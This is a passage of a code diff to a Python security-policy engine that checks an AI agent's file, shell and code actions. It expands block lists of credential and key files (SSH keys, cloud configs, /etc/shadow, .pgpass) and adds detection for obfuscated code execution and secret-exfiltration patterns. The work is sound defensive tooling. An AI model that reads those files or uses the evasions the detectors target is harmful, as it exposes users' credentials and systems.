@@ -37,25 +37,31 @@ import textwrap
 import time
 from collections import Counter, deque
 from urllib.parse import urlparse
-from dataclasses import dataclass, field
+from dataclasses import dataclass
 from pathlib import Path
 from typing import Any, Deque, Dict, List, Optional, Sequence, Set, Tuple, Union
 
 from .runtime_paths import append_jsonl_bounded, get_default_journal_path
 from .secrets import (
-    _REDACT_PATTERNS,
     _SECRET_PATTERNS,
     _SECRET_TOKEN_REGEXES,
     redact_secrets,
-    scrub_tool_output,
 )
 
 log = logging.getLogger(__name__)
 
 RULES_VERSION = "2.1.0-layered-structural"
 DEFAULT_MODEL_VERSION = "analytical-wsp-v2.1"
-DEFAULT_JOURNAL_PATH = get_default_journal_path()
+_INITIAL_DEFAULT_JOURNAL_PATH = get_default_journal_path()
+DEFAULT_JOURNAL_PATH = _INITIAL_DEFAULT_JOURNAL_PATH
 _DECISION_RING_BUFFER: Deque[Dict[str, Any]] = deque(maxlen=500)
+
+
+def _effective_default_journal_path() -> Path:
+    """Resolve journal path dynamically while still honoring test monkeypatches on DEFAULT_JOURNAL_PATH."""
+    if DEFAULT_JOURNAL_PATH != _INITIAL_DEFAULT_JOURNAL_PATH:
+        return Path(DEFAULT_JOURNAL_PATH)
+    return get_default_journal_path()
 
 # Tool risk taxonomy (Layer 0)
 TOOL_RISK_CLASSES: Dict[str, str] = {
@@ -129,6 +135,26 @@ DEFAULT_PROTECTED_PATTERNS: Tuple[str, ...] = (
     ".aws/config",
     ".kube/config",
     ".docker/config.json",
+    ".config/gh/hosts.yml",
+    ".config/gcloud/",
+    ".azure/",
+    ".gnupg/",
+    ".cargo/credentials",
+    ".cargo/credentials.toml",
+    ".gem/credentials",
+    ".terraform.d/credentials.tfrc.json",
+    ".pgpass",
+    ".my.cnf",
+    ".vault-token",
+    ".claude.json",
+    ".envrc",
+    "authorized_keys",
+    "id_ecdsa",
+    "id_dsa",
+    "*.pem",
+    "*.key",
+    "*.p12",
+    "*.pfx",
     "/etc/passwd",
     "/etc/shadow",
     "/etc/sudoers",
@@ -154,20 +180,29 @@ DEFAULT_PROTECTED_PATTERNS: Tuple[str, ...] = (
 
 _PROTECTED_EXACT_BASENAMES: Set[str] = {
     ".env",
+    ".envrc",
     ".npmrc",
     ".netrc",
     ".pypirc",
+    ".pgpass",
+    ".my.cnf",
+    ".vault-token",
+    ".claude.json",
     ".gitconfig",
     ".bashrc",
     ".zshrc",
     ".profile",
     ".bash_profile",
     ".zprofile",
+    "authorized_keys",
     "id_rsa",
     "id_ed25519",
+    "id_ecdsa",
+    "id_dsa",
     "credentials.json",
     "secrets.yaml",
     "secrets.json",
+    "hosts.yml",
     "claude.md",
     "agents.md",
     ".cursorrules",
@@ -190,6 +225,7 @@ class PolicyConfig:
     """Configurable security policy without hardcoded domain dogma."""
 
     protected_patterns: Tuple[str, ...] = DEFAULT_PROTECTED_PATTERNS
+    extra_protected_patterns: Tuple[str, ...] = ()
     require_approval_for_external: bool = False
     require_approval_for_irreversible: bool = True
     require_full_source_for_allow: bool = False
@@ -198,6 +234,8 @@ class PolicyConfig:
     max_diff_lines: int = 480
     strict_ast_allowlist: bool = False
     allowed_ast_imports: Tuple[str, ...] = DEFAULT_ALLOWED_AST_IMPORTS
+    allow_inline_suppression: bool = True
+    custom_rules: Tuple[Dict[str, Any], ...] = ()
     # Operator web domain allowlist: `webfetch`/`websearch` targets on these
     # domains are allowed even when `require_approval_for_external` is set.
     # Empty by default (behavior unchanged); subdomains match implicitly.
@@ -224,10 +262,42 @@ class PolicyConfig:
             raise ValueError(f"Unknown PolicyConfig field(s): {', '.join(unknown)}")
         kwargs: Dict[str, Any] = {}
         for k, v in data.items():
-            if k in ("protected_patterns", "allowed_ast_imports", "allowed_web_domains", "trusted_mcp_servers"):
+            if k in (
+                "protected_patterns",
+                "extra_protected_patterns",
+                "allowed_ast_imports",
+                "allowed_web_domains",
+                "trusted_mcp_servers",
+            ):
                 if not isinstance(v, (list, tuple, set)):
                     raise ValueError(f"PolicyConfig field {k!r} must be a list/tuple, got {type(v).__name__}")
                 kwargs[k] = tuple(str(x) for x in v)
+            elif k == "custom_rules":
+                if not isinstance(v, (list, tuple)):
+                    raise ValueError(f"PolicyConfig field 'custom_rules' must be a list/tuple, got {type(v).__name__}")
+                validated_rules: List[Dict[str, Any]] = []
+                for idx, item in enumerate(v):
+                    if not isinstance(item, dict):
+                        raise ValueError(f"PolicyConfig.custom_rules[{idx}] must be a dict")
+                    rule_id = str(item.get("id") or "").strip()
+                    action = str(item.get("action") or "").strip().lower()
+                    if not rule_id:
+                        raise ValueError(f"PolicyConfig.custom_rules[{idx}] missing non-empty 'id'")
+                    if action not in {"deny", "escalate"}:
+                        raise ValueError(f"PolicyConfig.custom_rules[{idx}] invalid action {action!r}")
+                    for rk in ("tool", "cmd_regex"):
+                        rv = item.get(rk)
+                        if rv is not None:
+                            try:
+                                re.compile(str(rv))
+                            except re.error as exc:
+                                raise ValueError(f"PolicyConfig.custom_rules[{idx}].{rk} invalid regex: {exc}") from exc
+                    validated_rules.append(dict(item))
+                kwargs[k] = tuple(validated_rules)
+            elif k == "allow_inline_suppression":
+                if not isinstance(v, bool):
+                    raise ValueError(f"PolicyConfig.allow_inline_suppression must be a bool, got {type(v).__name__}")
+                kwargs[k] = v
             else:
                 kwargs[k] = v
         cfg = cls(**kwargs)
@@ -375,6 +445,12 @@ class PolicyConfig:
 DEFAULT_POLICY = PolicyConfig()
 
 
+def _policy_protected_patterns(policy: Optional[PolicyConfig]) -> Tuple[str, ...]:
+    cfg = policy or DEFAULT_POLICY
+    extra = tuple(getattr(cfg, "extra_protected_patterns", ()) or ())
+    return tuple(cfg.protected_patterns) + extra
+
+
 def is_protected_path(path_str: Optional[str], policy: Optional[PolicyConfig] = None) -> bool:
     """Return True if path points to a constitutional, credential, or security-critical asset.
 
@@ -388,7 +464,7 @@ def is_protected_path(path_str: Optional[str], policy: Optional[PolicyConfig] = 
     raw = str(path_str)
     if "\x00" in raw:
         return True
-    cfg = policy or DEFAULT_POLICY
+    all_patterns = _policy_protected_patterns(policy)
     normalized = raw.replace("\\", "/").strip().lower()
     raw_segments = [seg for seg in normalized.split("/") if seg]
     if ".env" in raw_segments:
@@ -404,20 +480,11 @@ def is_protected_path(path_str: Optional[str], policy: Optional[PolicyConfig] = 
     if basename == ".env" or basename.startswith(".env.") or basename in _PROTECTED_EXACT_BASENAMES:
         return True
     clean_target = norm_path.strip("/")
-    if any(clean_target == pat.strip("/").lower() for pat in cfg.protected_patterns):
+    if any(clean_target == pat.strip("/").lower() for pat in all_patterns):
         return True
 
     # Glob and wildcard pattern matching (supporting wildcards anywhere in the path, e.g. .e?, .ss*, .s?h)
     if any(ch in normalized for ch in "*?["):
-        # Guard against false positives from broad globs:
-        #   - Pure wildcards: *, ?, src/* — basename starts with a wildcard char
-        #   - Extension globs: *.md, *.txt — also start with '*', would match custom patterns like 'bible.md'
-        #
-        # Legitimate protective globs (.en?, .ss*, .s?h) ALWAYS start with '.' (a dotfile/dotdir prefix).
-        # Broad/benign globs (*, *.md, src/*) start with '*', '?', or an alnum char.
-        # So: skip the "user's glob matches a protected pattern" checks when the top-level
-        # normalized path does NOT start with '.', '~/.', or contain only wildcard chars.
-        # We still run checks for targeted globs like .en?, .ss*/config.
         normalized_stripped = normalized.lstrip("/")
         path_is_targeted_dotglob = normalized_stripped.startswith(".") or normalized_stripped.startswith("~/.")
         normalized_is_pure_wildcard = normalized and all(ch in "*?[/" for ch in normalized)
@@ -427,7 +494,7 @@ def is_protected_path(path_str: Optional[str], policy: Optional[PolicyConfig] = 
             if any(fnmatch.fnmatch(sens, basename) for sens in _PROTECTED_EXACT_BASENAMES):
                 return True
             # Match against all protected patterns and directories
-            for pat in cfg.protected_patterns:
+            for pat in all_patterns:
                 cpat = pat.strip("/").lower()
                 if not cpat:
                     continue
@@ -442,12 +509,9 @@ def is_protected_path(path_str: Optional[str], policy: Optional[PolicyConfig] = 
         for i in range(1, len(segs) + 1):
             subpath = "/".join(segs[:i]).strip("/")
             seg = segs[i - 1]
-            # Skip segments that are pure wildcards (*, ?) or broad extension globs (*.md, *.txt):
-            # these would match arbitrary protected names via fnmatch(cpat, seg).
-            # Legitimate targeted globs (.en?, .ss*) always start with '.', never with '*' or '?'.
             if seg and (all(ch in "*?[" for ch in seg) or seg[0] in "*?["):
                 continue
-            for pat in cfg.protected_patterns:
+            for pat in all_patterns:
                 cpat = pat.strip("/").lower()
                 if not cpat:
                     continue
@@ -458,7 +522,7 @@ def is_protected_path(path_str: Optional[str], policy: Optional[PolicyConfig] = 
                     return True
 
     norm_segments = [seg for seg in norm_path.strip("/").split("/") if seg]
-    for pat in cfg.protected_patterns:
+    for pat in all_patterns:
         if pat == ".env":
             continue
         clean_pat = pat.strip("/").lower()
@@ -596,7 +660,7 @@ def _parse_python_with_context(code_text: str) -> Optional[ast.AST]:
     return tree
 
 
-def _is_benign_relative_path_literal(path_str: Optional[str]) -> bool:
+def _is_benign_relative_path_literal(path_str: Optional[str], policy: Optional[PolicyConfig] = None) -> bool:
     """Return True if literal target is a simple relative path without traversal/wildcards/protected assets."""
     if not path_str or not isinstance(path_str, str):
         return False
@@ -613,7 +677,7 @@ def _is_benign_relative_path_literal(path_str: Optional[str]) -> bool:
         return False
     if any(seg.lower() == ".git" for seg in segs):
         return False
-    return not is_protected_path(raw)
+    return not is_protected_path(raw, policy=policy)
 
 
 def _const_str(node: ast.AST) -> Optional[str]:
@@ -629,23 +693,26 @@ def _const_str(node: ast.AST) -> Optional[str]:
 
 
 class _SecurityASTVisitor(ast.NodeVisitor):
-    """AST security analyzer catching direct, aliased, subscript, encoded, and getattr sinks."""
+    """AST security analyzer catching direct, aliased, subscript, encoded, Path-var, and getattr sinks."""
 
     DANGEROUS_BUILTINS = {"eval", "exec", "compile", "__import__"}
-    DANGEROUS_ATTRS = {"system", "popen", "rmtree", "loads", "load", "unsafe_load", "spawn"}
+    DANGEROUS_ATTRS = {"system", "popen", "rmtree", "loads", "load", "unsafe_load", "spawn", "run_path", "run_module"}
     DANGEROUS_MODULES = {
         "os", "subprocess", "shutil", "pickle", "cpickle", "marshal", "shelve",
         "pty", "builtins", "__builtins__", "importlib",
+        "ctypes", "yaml", "runpy", "code", "webbrowser", "operator",
     }
     SUBSCRIPT_SCOPE_NAMES = {"__builtins__", "builtins", "globals", "locals", "vars"}
 
-    def __init__(self) -> None:
+    def __init__(self, policy: Optional[PolicyConfig] = None) -> None:
+        self.policy = policy
         self.findings: List[str] = []
         self.structural_findings: List[Dict[str, Any]] = []
         self.finding_lines: Dict[str, List[int]] = {}
         self.scope_stack: List[str] = []
         self.dangerous_aliases: Set[str] = set()
         self.module_aliases: Dict[str, str] = {}
+        self.path_vars: Dict[str, str] = {}
         self.decoded_vars: Set[str] = set()
         self.has_network_sink: bool = False
         self.has_env_secret_read: bool = False
@@ -713,8 +780,27 @@ class _SecurityASTVisitor(ast.NodeVisitor):
         return False
 
     @classmethod
-    def _check_subscript_lookup(cls, node: ast.Subscript) -> Optional[str]:
+    def _check_subscript_lookup(
+        cls,
+        node: ast.Subscript,
+        module_aliases: Optional[Dict[str, str]] = None,
+    ) -> Optional[str]:
         val = node.value
+        key = _const_str(node.slice)
+        aliases = module_aliases or {}
+        if isinstance(val, ast.Attribute) and val.attr == "__dict__":
+            base = val.value
+            base_name = base.id if isinstance(base, ast.Name) else ""
+            resolved = aliases.get(base_name, base_name).lower()
+            if base_name in cls.SUBSCRIPT_SCOPE_NAMES or resolved in cls.DANGEROUS_MODULES:
+                if key is None or key in cls.DANGEROUS_BUILTINS or key in cls.DANGEROUS_ATTRS or key in {"getattr", "import_module", "open", "system", "popen"}:
+                    return key or "<dynamic>"
+            return None
+        if isinstance(val, ast.Attribute) and cls._attr_chain(val) == "sys.modules":
+            top_k = key.split(".")[0].lower() if key else None
+            if top_k is None or top_k in cls.DANGEROUS_MODULES or top_k in {"sys", "builtins"}:
+                return key or "<dynamic>"
+            return None
         is_scope = False
         if isinstance(val, ast.Name) and val.id in cls.SUBSCRIPT_SCOPE_NAMES:
             is_scope = True
@@ -722,7 +808,6 @@ class _SecurityASTVisitor(ast.NodeVisitor):
             is_scope = True
         if not is_scope:
             return None
-        key = _const_str(node.slice)
         if key is None or key in cls.DANGEROUS_BUILTINS or key in cls.DANGEROUS_ATTRS or key in {"getattr", "import_module", "open"}:
             return key or "<dynamic>"
         return None
@@ -748,6 +833,15 @@ class _SecurityASTVisitor(ast.NodeVisitor):
                 self.module_aliases[as_name] = root_mod
         self.generic_visit(node)
 
+    _DANGEROUS_IMPORTFROM_NAMES = {
+        "system", "popen", "rmtree", "run", "call", "check_output", "check_call",
+        "getoutput", "getstatusoutput", "loads", "load", "unsafe_load", "remove", "unlink", "rmdir",
+        "import_module", "run_path", "run_module", "execl", "execle", "execlp", "execlpe", "execv", "execve",
+        "execvp", "execvpe", "spawnl", "spawnle", "spawnlp", "spawnlpe", "spawnv",
+        "spawnve", "spawnvp", "spawnvpe", "posix_spawn", "posix_spawnp", "fork",
+        "cdll", "pydll", "oledll", "windll", "libraryloader", "run_path", "run_module", "attrgetter",
+    }
+
     def visit_ImportFrom(self, node: ast.ImportFrom) -> None:
         mod = (node.module or "").split(".")[0].lower()
         for alias in node.names:
@@ -755,7 +849,7 @@ class _SecurityASTVisitor(ast.NodeVisitor):
             as_name = alias.asname or alias.name
             if name_lower in self.DANGEROUS_BUILTINS or (
                 mod in self.DANGEROUS_MODULES
-                and name_lower in {"system", "popen", "rmtree", "run", "call", "check_output", "loads", "load", "remove", "unlink", "import_module"}
+                and name_lower in self._DANGEROUS_IMPORTFROM_NAMES
             ):
                 self.dangerous_aliases.add(as_name)
         self.generic_visit(node)
@@ -769,7 +863,26 @@ class _SecurityASTVisitor(ast.NodeVisitor):
             self._check_alias_assignment([node.target], node.value)
         self.generic_visit(node)
 
+    def _extract_path_ctor_literal(self, node: ast.AST) -> Optional[str]:
+        if isinstance(node, ast.Call) and node.args:
+            is_path_ctor = (isinstance(node.func, ast.Name) and node.func.id in {"Path", "PurePath", "PosixPath", "WindowsPath"}) or (
+                self._attr_chain(node.func) in {"pathlib.path", "pathlib.purepath", "pathlib.posixpath", "pathlib.windowspath"}
+            )
+            if is_path_ctor:
+                return self._fold_str(node.args[0]) or _const_str(node.args[0])
+        return None
+
     def _check_alias_assignment(self, targets: List[ast.AST], value: ast.AST) -> None:
+        path_lit = self._extract_path_ctor_literal(value)
+        if path_lit:
+            for tgt in targets:
+                if isinstance(tgt, ast.Name):
+                    self.path_vars[tgt.id] = path_lit
+        else:
+            for tgt in targets:
+                if isinstance(tgt, ast.Name) and tgt.id in self.path_vars:
+                    self.path_vars.pop(tgt.id, None)
+
         if self._is_decode_call(value):
             for tgt in targets:
                 if isinstance(tgt, ast.Name):
@@ -778,7 +891,7 @@ class _SecurityASTVisitor(ast.NodeVisitor):
         is_dangerous_rhs = False
         if isinstance(value, ast.Name) and (value.id in self.DANGEROUS_BUILTINS or value.id in self.dangerous_aliases):
             is_dangerous_rhs = True
-        elif isinstance(value, ast.Attribute) and value.attr in {"system", "popen", "rmtree", "loads", "run", "call", "import_module"}:
+        elif isinstance(value, ast.Attribute) and value.attr in {"system", "popen", "rmtree", "loads", "load", "unsafe_load", "run", "call", "import_module", "CDLL", "PyDLL", "OleDLL", "WinDLL", "LibraryLoader"}:
             is_dangerous_rhs = True
         elif isinstance(value, ast.Call) and isinstance(value.func, ast.Name):
             if value.func.id == "__import__":
@@ -786,7 +899,7 @@ class _SecurityASTVisitor(ast.NodeVisitor):
             elif value.func.id == "getattr":
                 is_dangerous_rhs = self._is_dangerous_getattr_call(value)
         elif isinstance(value, ast.Subscript):
-            sub_key = self._check_subscript_lookup(value)
+            sub_key = self._check_subscript_lookup(value, self.module_aliases)
             if sub_key is not None:
                 is_dangerous_rhs = True
                 self.findings.append(f"obfuscated_subscript_builtin:{sub_key}")
@@ -798,7 +911,7 @@ class _SecurityASTVisitor(ast.NodeVisitor):
                     self._record_finding(f"dangerous_alias:{tgt.id}", tgt, tgt.id)
 
     def visit_Subscript(self, node: ast.Subscript) -> None:
-        sub_key = self._check_subscript_lookup(node)
+        sub_key = self._check_subscript_lookup(node, self.module_aliases)
         if sub_key is not None:
             flag = f"obfuscated_subscript_builtin:{sub_key}"
             if flag not in self.findings:
@@ -890,7 +1003,7 @@ class _SecurityASTVisitor(ast.NodeVisitor):
                 self._check_getattr(node)
             elif func.id == "open" and node.args:
                 open_path = self._fold_str(node.args[0]) or _const_str(node.args[0])
-                if open_path and is_protected_path(open_path):
+                if open_path and is_protected_path(open_path, policy=self.policy):
                     self._record_finding("ast_protected_file_access", node, open_path)
 
         # Case 2: Obfuscated dynamic dispatch `getattr(os, 'sys' + 'tem')(...)`
@@ -909,7 +1022,7 @@ class _SecurityASTVisitor(ast.NodeVisitor):
 
         # Case 2b: Direct subscript invocation (`globals()['eval'](...)`, `__builtins__['exec'](...)`)
         elif isinstance(func, ast.Subscript):
-            sub_key = self._check_subscript_lookup(func)
+            sub_key = self._check_subscript_lookup(func, self.module_aliases)
             if sub_key is not None:
                 self._record_finding(f"obfuscated_dynamic_subscript_call:{sub_key}", node, str(sub_key))
                 if self._uses_decoded_payload(node.args):
@@ -919,8 +1032,9 @@ class _SecurityASTVisitor(ast.NodeVisitor):
         elif isinstance(func, ast.Attribute):
             attr = func.attr
             chain = self._attr_chain(func)
-            base_name = func.value.id.lower() if isinstance(func.value, ast.Name) else ""
-            resolved_mod = self.module_aliases.get(base_name, base_name)
+            raw_base = func.value.id if isinstance(func.value, ast.Name) else ""
+            base_name = raw_base.lower()
+            resolved_mod = self.module_aliases.get(raw_base, self.module_aliases.get(base_name, base_name))
 
             if chain in {
                 "urllib.request.urlopen",
@@ -938,22 +1052,26 @@ class _SecurityASTVisitor(ast.NodeVisitor):
             }:
                 self.has_network_sink = True
 
-            if attr in {"read_text", "read_bytes", "open"} and isinstance(func.value, ast.Call):
-                if func.value.args:
+            if attr in {"read_text", "read_bytes", "write_text", "write_bytes", "open", "unlink"}:
+                if isinstance(func.value, ast.Call) and func.value.args:
                     p_str = self._fold_str(func.value.args[0]) or _const_str(func.value.args[0])
-                    if p_str and is_protected_path(p_str):
+                    if p_str and is_protected_path(p_str, policy=self.policy):
+                        self._record_finding("ast_protected_file_access", node, p_str)
+                elif isinstance(func.value, ast.Name) and func.value.id in self.path_vars:
+                    p_str = self.path_vars[func.value.id]
+                    if p_str and is_protected_path(p_str, policy=self.policy):
                         self._record_finding("ast_protected_file_access", node, p_str)
 
             if resolved_mod in {"io", "codecs", "os"} and attr == "open" and node.args:
                 p_str = self._fold_str(node.args[0]) or _const_str(node.args[0])
-                if p_str and is_protected_path(p_str):
+                if p_str and is_protected_path(p_str, policy=self.policy):
                     self._record_finding("ast_protected_file_access", node, p_str)
             elif resolved_mod == "fileinput" and attr == "input" and node.args:
                 arg0 = node.args[0]
                 cand_nodes = list(arg0.elts) if isinstance(arg0, (ast.List, ast.Tuple)) else [arg0]
                 for cn in cand_nodes:
                     p_str = self._fold_str(cn) or _const_str(cn)
-                    if p_str and is_protected_path(p_str):
+                    if p_str and is_protected_path(p_str, policy=self.policy):
                         self._record_finding("ast_protected_file_access", node, p_str)
 
             if attr in {"getenv", "get"} and node.args:
@@ -995,12 +1113,30 @@ class _SecurityASTVisitor(ast.NodeVisitor):
                     self._record_finding(rule_tag, node, f"subprocess.{attr}")
                     if self._uses_decoded_payload(node.args):
                         self._record_finding("obfuscated_encoded_payload", node, f"subprocess.{attr}")
+                    if not has_shell_true and node.args:
+                        cmd_preview: Optional[str] = None
+                        arg0 = node.args[0]
+                        folded_str = self._fold_str(arg0)
+                        if folded_str is not None:
+                            cmd_preview = folded_str
+                        elif isinstance(arg0, (ast.List, ast.Tuple)) and arg0.elts:
+                            pieces = [self._fold_str(e) for e in arg0.elts]
+                            if all(p is not None for p in pieces):
+                                cmd_preview = shlex.join([p for p in pieces if p is not None])
+                        if cmd_preview:
+                            sh_res = analyze_shell_command(cmd_preview, policy=self.policy)
+                            if not sh_res.get("is_safe", True) and sh_res.get("findings"):
+                                self._record_finding(
+                                    f"subprocess_unsafe_command:{sh_res['findings'][0]}",
+                                    node,
+                                    cmd_preview[:80],
+                                )
             elif resolved_mod == "shutil" or (isinstance(func.value, ast.Name) and func.value.id == "shutil"):
                 if attr == "rmtree":
                     rm_target = (self._fold_str(node.args[0]) or _const_str(node.args[0])) if node.args else None
                     rm_rule = (
                         "destructive_fs_call_relative:shutil.rmtree"
-                        if _is_benign_relative_path_literal(rm_target)
+                        if _is_benign_relative_path_literal(rm_target, policy=self.policy)
                         else "destructive_fs_call:shutil.rmtree"
                     )
                     self._record_finding(rm_rule, node, "shutil.rmtree")
@@ -1022,6 +1158,8 @@ class _SecurityASTVisitor(ast.NodeVisitor):
                 )
                 if not has_safe_loader:
                     self._record_finding(f"unsafe_yaml_load:yaml.{attr}", node, f"yaml.{attr}")
+            elif resolved_mod == "runpy" and attr in {"run_path", "run_module", "_run_code", "_run_module_code"}:
+                self._record_finding(f"dangerous_runpy_call:runpy.{attr}", node, f"runpy.{attr}")
 
         self.generic_visit(node)
 
@@ -1029,8 +1167,8 @@ class _SecurityASTVisitor(ast.NodeVisitor):
         target_obj = ""
         if node.args:
             if isinstance(node.args[0], ast.Name):
-                raw_name = node.args[0].id.lower()
-                target_obj = self.module_aliases.get(raw_name, raw_name)
+                raw_name = node.args[0].id
+                target_obj = self.module_aliases.get(raw_name, self.module_aliases.get(raw_name.lower(), raw_name.lower()))
             elif isinstance(node.args[0], ast.Call) and isinstance(node.args[0].func, ast.Name):
                 raw_name = node.args[0].func.id.lower()
                 target_obj = self.module_aliases.get(raw_name, raw_name)
@@ -1206,6 +1344,7 @@ def _suppression_matches(rule_token: str, finding: str) -> bool:
 def _partition_suppressed_ast_findings(
     visitor: _SecurityASTVisitor,
     source_text: str,
+    allow_suppression: bool = True,
 ) -> Tuple[List[str], List[Dict[str, Any]]]:
     """Split visitor AST findings into active findings and auditable inline suppressions."""
     lines = source_text.splitlines() if source_text else []
@@ -1221,7 +1360,7 @@ def _partition_suppressed_ast_findings(
         lineno = int(sf.get("lineno") or 0)
         end_lineno = int(sf.get("end_lineno") or lineno or 0)
         supp_match: Optional[Tuple[int, str]] = None
-        if _is_finding_suppressible(rule) and lineno >= 1 and lines:
+        if allow_suppression and _is_finding_suppressible(rule) and lineno >= 1 and lines:
             lo = max(1, lineno)
             hi = min(len(lines), max(lineno, end_lineno))
             for ln_no in range(lo, hi + 1):
@@ -1293,6 +1432,7 @@ def _scan_outbound_secret_egress(
 def _detect_secret_leaks(
     lines: Sequence[str],
     suppressed_out: Optional[List[Dict[str, Any]]] = None,
+    allow_suppression: bool = True,
 ) -> List[str]:
     """Detect hardcoded API tokens, PEM private keys, and literal credential assignments."""
     for idx, ln in enumerate(lines, start=1):
@@ -1307,7 +1447,7 @@ def _detect_secret_leaks(
                 if not any(marker in val_lower for marker in _SECRET_PLACEHOLDER_MARKERS):
                     matched_secret = True
         if matched_secret:
-            supp = _parse_inline_suppression(ln)
+            supp = _parse_inline_suppression(ln) if allow_suppression else None
             if supp is not None and _suppression_matches(supp[0], "secret_leak_pattern_found"):
                 if suppressed_out is not None:
                     suppressed_out.append({
@@ -1446,6 +1586,8 @@ def _collect_ast_node_tags(tree: ast.AST) -> List[str]:
 
 
 _TREE_SITTER_GRAMMARS: Dict[str, Tuple[str, str]] = {
+    ".sh": ("tree_sitter_bash", "language"),
+    ".bash": ("tree_sitter_bash", "language"),
     ".js": ("tree_sitter_javascript", "language"),
     ".jsx": ("tree_sitter_javascript", "language"),
     ".ts": ("tree_sitter_typescript", "language_typescript"),
@@ -1460,6 +1602,59 @@ _TREE_SITTER_GRAMMARS: Dict[str, Tuple[str, str]] = {
     ".html": ("tree_sitter_html", "language"),
     ".css": ("tree_sitter_css", "language"),
 }
+
+
+def _scan_bash_ast_tree_sitter(cmd: str, policy: Optional[PolicyConfig] = None) -> Dict[str, Any]:
+    """Optional SOTA AST shell pass via tree-sitter-bash when installed (no-op when absent)."""
+    if not cmd or not cmd.strip():
+        return {"available": False, "findings": [], "protected_reads": []}
+    try:
+        ts_mod = importlib.import_module("tree_sitter")
+        ts_bash = importlib.import_module("tree_sitter_bash")
+        lang = ts_mod.Language(ts_bash.language())
+        parser = ts_mod.Parser(lang)
+        raw = cmd.encode("utf-8", errors="ignore")
+        tree = parser.parse(raw)
+        if tree is None or not hasattr(tree, "root_node"):
+            return {"available": False, "findings": [], "protected_reads": []}
+    except Exception:
+        return {"available": False, "findings": [], "protected_reads": []}
+
+    findings: List[str] = []
+    protected_reads: List[str] = []
+    stack = [tree.root_node]
+    while stack:
+        node = stack.pop()
+        ntype = getattr(node, "type", "")
+        text = raw[node.start_byte:node.end_byte].decode("utf-8", errors="ignore")
+        if ntype in {"command_substitution", "process_substitution"}:
+            findings.append("shell_command_substitution" if ntype == "command_substitution" else "shell_output_redirection")
+        elif ntype == "file_redirect":
+            redir_op = ""
+            redir_tgt = ""
+            for ch in getattr(node, "children", ()):
+                ct = getattr(ch, "type", "")
+                ctext = raw[ch.start_byte:ch.end_byte].decode("utf-8", errors="ignore").strip().strip("\"'")
+                if ct in {"<", ">", ">>", "&>", ">&"} or ct.endswith(("<", ">")):
+                    redir_op = ctext
+                elif ct not in {"file_descriptor", "number"} and ctext:
+                    redir_tgt = ctext
+            if redir_tgt:
+                if "<" in redir_op and "<<" not in redir_op:
+                    if is_protected_path(redir_tgt, policy=policy):
+                        protected_reads.append(redir_tgt)
+                elif ">" in redir_op and _is_privileged_or_unsafe_redirect_target(redir_tgt):
+                    findings.append("shell_output_redirection")
+        elif ntype == "expansion":
+            var_m = re.match(r"^\$\{?([A-Za-z_][A-Za-z0-9_]*)", text)
+            if var_m and var_m.group(1) == "IFS":
+                findings.append("shell_ifs_obfuscation")
+        stack.extend(reversed(getattr(node, "children", ())))
+    return {
+        "available": True,
+        "findings": list(dict.fromkeys(findings)),
+        "protected_reads": list(dict.fromkeys(protected_reads)),
+    }
 
 
 def _parse_with_tree_sitter(ext: str, code: str) -> Tuple[bool, Optional[bool]]:
@@ -1519,6 +1714,8 @@ def analyze_code_diff(
     diff_text: Optional[str],
     original_source: Optional[str] = None,
     edit_ops: Optional[Sequence[Dict[str, Any]]] = None,
+    policy: Optional[PolicyConfig] = None,
+    allow_suppression: bool = True,
 ) -> Dict[str, Any]:
     """Layer 1 language-aware structural diff analysis.
 
@@ -1593,7 +1790,11 @@ def analyze_code_diff(
     else:
         secret_scan_lines = dedented.splitlines()
     suppressed_findings: List[Dict[str, Any]] = []
-    secret_findings = _detect_secret_leaks(secret_scan_lines, suppressed_out=suppressed_findings)
+    secret_findings = _detect_secret_leaks(
+        secret_scan_lines,
+        suppressed_out=suppressed_findings,
+        allow_suppression=allow_suppression,
+    )
 
     # Non-Python files: skip Python ast.parse and validate format appropriately
     if ext == ".json":
@@ -1660,7 +1861,7 @@ def analyze_code_diff(
                     stripped = stripped[4:].strip()
                 else:
                     continue
-            sh_res = analyze_shell_command(stripped)
+            sh_res = analyze_shell_command(stripped, policy=policy)
             if not sh_res.get("is_safe", True):
                 for f_item in sh_res.get("findings", []):
                     sh_diff_findings.append(f"shell_script_unsafe_cmd:{f_item}")
@@ -1752,7 +1953,7 @@ def analyze_code_diff(
     if resolved_source:
         orig_tree = _parse_python_with_context(resolved_source)
         if orig_tree is not None:
-            seed_visitor = _SecurityASTVisitor()
+            seed_visitor = _SecurityASTVisitor(policy=policy)
             seed_visitor.visit(orig_tree)
             context_ast_parsed = True
 
@@ -1865,9 +2066,9 @@ def analyze_code_diff(
                 continue
             lt, lsrc = _parse_python_with_context_and_source(s_ln)
             if lt is not None:
-                lv = _SecurityASTVisitor()
+                lv = _SecurityASTVisitor(policy=policy)
                 lv.visit(lt)
-                l_active, _ = _partition_suppressed_ast_findings(lv, lsrc)
+                l_active, _ = _partition_suppressed_ast_findings(lv, lsrc, allow_suppression=allow_suppression)
                 line_findings.extend(l_active)
         line_findings = list(dict.fromkeys(line_findings))
         explicit_bad_syntax = any(
@@ -1900,13 +2101,14 @@ def analyze_code_diff(
     structural_findings: List[Dict[str, Any]] = []
     tree_supp: List[Dict[str, Any]] = []
     if tree is not None and tree is not patched_tree:
-        visitor = _SecurityASTVisitor()
+        visitor = _SecurityASTVisitor(policy=policy)
         if seed_visitor is not None:
             visitor.module_aliases.update(seed_visitor.module_aliases)
             visitor.dangerous_aliases.update(seed_visitor.dangerous_aliases)
+            visitor.path_vars.update(seed_visitor.path_vars)
             visitor.decoded_vars.update(seed_visitor.decoded_vars)
         visitor.visit(tree)
-        tree_active, tree_supp = _partition_suppressed_ast_findings(visitor, tree_source_text)
+        tree_active, tree_supp = _partition_suppressed_ast_findings(visitor, tree_source_text, allow_suppression=allow_suppression)
         hunk_findings.extend(tree_active)
         structural_findings.extend(visitor.structural_findings)
         if visitor.has_network_sink and (
@@ -1915,7 +2117,7 @@ def analyze_code_diff(
             hunk_findings.append("ast_secret_exfil_pattern")
 
     if patched_tree is not None:
-        patched_visitor = _SecurityASTVisitor()
+        patched_visitor = _SecurityASTVisitor(policy=policy)
         patched_visitor.visit(patched_tree)
         if patched_visitor.has_network_sink and (
             patched_visitor.has_env_secret_read
@@ -1925,8 +2127,8 @@ def analyze_code_diff(
         seed_active: List[str] = []
         seed_supp: List[Dict[str, Any]] = []
         if seed_visitor is not None and resolved_source is not None:
-            seed_active, seed_supp = _partition_suppressed_ast_findings(seed_visitor, resolved_source)
-        patched_active, patched_supp = _partition_suppressed_ast_findings(patched_visitor, patched_source or "")
